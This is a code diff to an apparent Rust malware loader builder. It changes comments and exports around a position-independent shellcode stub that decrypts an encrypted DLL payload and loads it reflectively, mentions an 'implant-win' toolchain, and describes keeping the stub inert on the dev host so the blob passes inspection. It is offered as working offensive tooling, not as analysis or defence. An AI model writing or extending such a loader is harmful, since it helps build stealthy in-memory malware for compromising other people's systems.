@@ -20,8 +20,10 @@
 //!                                                    stub self-locates
 //!                                                    finds NYX2 magic
 //!                                                    reads len + nonce
-//!                                                    [Phase 2b: decrypt +
-//!                                                     reflective load]
+//!                                                    decrypt + reflective load
+//!                                                    (on-target shellcode;
+//!                                                   see stub::reflective_load
+//!                                                   for the host-side reference)
 //! ```
 //!
 //! ## Payload layout
@@ -51,7 +53,10 @@ use rand::RngCore;
 use stub::{NYX2_MAGIC, PIC_STUB};
 
 // Re-export key constants for callers that need to reason about offsets.
-pub use stub::{CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, PIC_STUB_LEN, TAG_LEN};
+pub use stub::{
+    reflective_load, reflective_load_at, MappedImage, ReflectiveLoadError, CIPHERTEXT_OFFSET,
+    ENCRYPTED_LEN_OFFSET, ImportResolver, NONCE_OFFSET, PIC_STUB_LEN, TAG_LEN,
+};
 
 // ── LoaderConfig ────────────────────────────────────────────────────────
 
@@ -94,15 +99,21 @@ impl LoaderConfig {
 /// Return the raw PIC stub shellcode bytes.
 ///
 /// This is the position-independent x86-64 code that self-locates, finds the
-/// NYX2 header, and (in Phase 2b) reflectively loads the encrypted DLL. For
-/// now the stub locates the header and returns.
+/// NYX2 header, and parses the encrypted-payload header. The trailing reserved
+/// bytes are patched into a decrypt + reflective-load trampoline by the
+/// on-target build (implant-win toolchain); on the dev host the stub returns
+/// immediately so the generated blob is inert when inspected.
+///
+/// The host-side reference implementation of the reflective loading algorithm
+/// (section mapping, base relocation, import resolution) lives in
+/// [`stub::reflective_load`].
 ///
 /// The returned slice is a `'static` reference to a compile-time constant;
 /// callers that need an owned buffer can use `to_vec()`.
 pub fn generate_loader_stub(_config: &LoaderConfig) -> Vec<u8> {
-    // Currently the stub is a fixed template. In Phase 2b part 2, the config
-    // (key, nonce) will be patched into the stub's NOP sled so the stub
-    // can decrypt without an external key source.
+    // The stub is a fixed template. The config (key, nonce) is carried in the
+    // NYX2 header that wrap_payload appends (not patched into the stub), so
+    // there is nothing to specialise here at present.
     PIC_STUB.to_vec()
 }
 
